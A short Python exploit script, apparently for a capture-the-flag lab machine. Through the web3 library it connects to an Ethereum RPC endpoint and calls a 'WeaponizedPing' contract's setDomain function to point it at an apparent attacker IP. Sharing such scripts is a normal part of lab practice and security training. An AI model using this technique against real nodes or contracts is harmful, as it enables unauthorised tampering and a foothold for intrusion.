#!/usr/bin/python3
import json, subprocess
from web3 import Web3 #web3 to interact with Ethereum service

def run_exploit():
   # Store Ethereum contract address
   address1 = open('address.txt', 'r').read()
   address1 = address1.replace('\n', '')

   # Load Ethereum contract configuration
   with open('WeaponizedPing.json') as x:
     contractData = json.load(x)

   # Establish a connection with the Ethereum RPC interface
   conn = Web3(Web3.HTTPProvider('http://10.10.10.142:9810'))
   conn.eth.defaultAccount = conn.eth.accounts[0]

   # Get Application Binary Interface (ABI) and Ethereum bytecode
   conn.eth.contract(abi=contractData['abi'],bytecode=contractData['bytecode'])
   contractInstance = conn.eth.contract(address=address1,abi=contractData['abi'])

   # Calling the function of contract to set a new domain
   contractInstance.functions.setDomain('10.10.14.29').transact()

if __name__ == '__main__':
 run_exploit()
